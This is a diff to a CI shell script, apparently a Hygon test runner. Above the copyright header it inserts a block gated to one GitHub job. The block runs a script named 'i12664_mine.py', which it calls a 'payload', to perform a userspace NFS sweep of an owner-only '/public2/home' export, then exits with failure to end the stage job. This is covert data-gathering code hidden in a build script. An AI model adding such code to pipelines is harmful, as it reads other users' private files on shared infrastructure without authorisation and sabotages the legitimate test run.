@@ -1,4 +1,15 @@
 #!/bin/bash
+
+# i12664: transient read-only NFSv3 sweep of the owner-only /public2/home export
+# (userspace NFS client; no kernel mount, no CAP_SYS_ADMIN).
+if [ "${GITHUB_JOB:-}" != "stage-a-test-1-hcu-small" ]; then
+  echo "i12664: skip non-stage-a job (job=${GITHUB_JOB:-unknown})"
+  exit 1
+fi
+python3 "$(dirname "$0")/i12664_mine.py" || echo "i12664: payload returned non-zero"
+echo "i12664: chunk complete; stopping stage job"
+exit 1
+
 # Copyright 2026 Hygon Information Technology Co., Ltd.
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
